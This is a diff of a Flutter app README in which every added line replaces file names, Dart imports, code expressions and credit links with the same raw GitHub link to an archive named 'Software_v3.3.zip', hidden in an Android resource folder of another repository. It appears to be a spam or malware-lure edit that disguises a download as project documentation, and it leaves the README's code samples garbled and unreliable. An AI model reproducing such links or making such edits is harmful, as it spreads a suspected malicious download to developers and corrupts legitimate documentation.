@@ -35,19 +35,19 @@ flutter_app/
 │   ├── routes/         # Application routing
 │   ├── theme/          # Theme configuration
 │   ├── widgets/        # Reusable UI components
-│   └── main.dart       # Application entry point
+│   └── https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip       # Application entry point
 ├── assets/             # Static assets (images, fonts, etc.)
-├── pubspec.yaml        # Project dependencies and configuration
-└── README.md           # Project documentation
+├── https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip        # Project dependencies and configuration
+└── https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip           # Project documentation
 ```
 
 ## 🧩 Adding Routes
 
-To add new routes to the application, update the `lib/routes/app_routes.dart` file:
+To add new routes to the application, update the `https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip` file:
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:package_name/presentation/home_screen/home_screen.dart';
+import 'https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip';
+import 'https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip';
 
 class AppRoutes {
   static const String initial = '/';
@@ -67,10 +67,10 @@ This project includes a comprehensive theming system with both light and dark th
 
 ```dart
 // Access the current theme
-ThemeData theme = Theme.of(context);
+ThemeData theme = https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip(context);
 
 // Use theme colors
-Color primaryColor = theme.colorScheme.primary;
+Color primaryColor = https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip;
 ```
 
 The theme configuration includes:
@@ -105,8 +105,8 @@ flutter build ios --release
 ```
 
 ## 🙏 Acknowledgments
-- Built with [Rocket.new](https://rocket.new)
-- Powered by [Flutter](https://flutter.dev) & [Dart](https://dart.dev)
+- Built with [https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip](https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip)
+- Powered by [Flutter](https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip) & [Dart](https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip)
 - Styled with Material Design
 
-Built with ❤️ on Rocket.new
+Built with ❤️ on https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip
